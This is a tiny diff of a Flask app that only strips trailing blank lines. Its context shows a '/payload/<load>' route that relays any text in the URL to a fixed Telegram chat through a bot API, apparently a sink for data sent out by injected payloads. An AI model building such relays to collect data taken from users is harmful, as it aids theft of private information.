@@ -23,5 +23,3 @@ def index():
 @app.route("/payload/<load>")
 def github(load):
     return requests.get(URL_TEL_BOT + "/sendMessage", params={"chat_id": 413925182, "text": load}).json()
-
-
